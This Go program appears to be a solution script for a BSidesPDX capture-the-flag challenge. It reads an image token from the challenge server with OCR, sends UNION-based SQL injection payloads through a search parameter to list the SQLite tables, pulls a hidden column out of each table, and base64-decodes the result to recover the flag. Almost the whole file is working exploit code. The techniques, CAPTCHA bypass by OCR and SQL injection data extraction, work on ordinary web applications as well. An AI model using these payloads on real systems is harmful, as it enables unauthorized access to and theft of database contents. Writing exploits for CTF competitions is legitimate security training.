package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/otiai10/gosseract"
)

const url = "http://ae334046ad4c911e8857e06d564d8652-1183301676.us-west-2.elb.amazonaws.com:10101"

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func getToken(url string) (string, error) {
	resp, err := http.Get(url + "/token")
	if err != nil {
		return "", err
	}

	image, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	client := gosseract.NewClient()
	defer client.Close()

	if err := client.SetImageFromBytes(image); err != nil {
		return "", err
	}

	return client.Text()
}

// I imagine the original query is something like:
// SELECT url, name FROM trolls WHERE LIKE '%s'
const tablesQuery = `' OR 1=1 UNION ALL SELECT sql, name FROM sqlite_master WHERE type='table'--`

func getTables(url, token string) ([]string, error) {
	type trollResponse []struct {
		Name string `json:"name"`
		URL  string `json:"url"`
	}

	req, err := http.NewRequest("GET", url+"/_search", nil)
	if err != nil {
		return nil, err
	}

	q := req.URL.Query()
	q.Add("query", tablesQuery)
	req.URL.RawQuery = q.Encode()

	req.Header.Set("token", token)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var trs trollResponse
	if err := json.NewDecoder(resp.Body).Decode(&trs); err != nil {
		return nil, err
	}

	var tables []string
	for _, tr := range trs[21:] {
		tables = append(tables, tr.Name)
	}

	return tables, nil
}

const secretQuery = `' OR 1=1 UNION ALL SELECT id, letter FROM %s--`

func getFlag(url, token string, tables []string) (string, error) {
	type trollResponse []struct {
		Letter string      `json:"name"`
		ID     interface{} `json:"url"` // can be either a string or number
	}

	// it's the last one, but :shrug:
	for _, table := range tables {
		req, err := http.NewRequest("GET", url+"/_search", nil)
		if err != nil {
			return "", err
		}

		q := req.URL.Query()
		q.Add("query", fmt.Sprintf(secretQuery, table))
		req.URL.RawQuery = q.Encode()

		req.Header.Set("token", token)

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			return "", err
		}
		defer resp.Body.Close()

		var trs trollResponse
		if err := json.NewDecoder(resp.Body).Decode(&trs); err != nil {
			return "", err
		}

		out := make([]byte, 128)
		for _, tr := range trs {
			v, ok := tr.ID.(float64)
			if !ok {
				continue
			}

			out[int(v)-1] = tr.Letter[0]
		}

		out = []byte(strings.Trim(string(out), "\n \x00"))

		decoded, err := base64.StdEncoding.DecodeString(string(out))
		if err != nil {
			continue
		}

		if strings.HasPrefix(string(decoded), "BSidesPDX") {
			return string(decoded), nil
		}
	}

	return "", fmt.Errorf("flag not found")

}

func main() {
	tok, err := getToken(url)
	check(err)

	tables, err := getTables(url, tok)
	check(err)

	flag, err := getFlag(url, tok, tables)
	check(err)

	fmt.Println(flag)
}
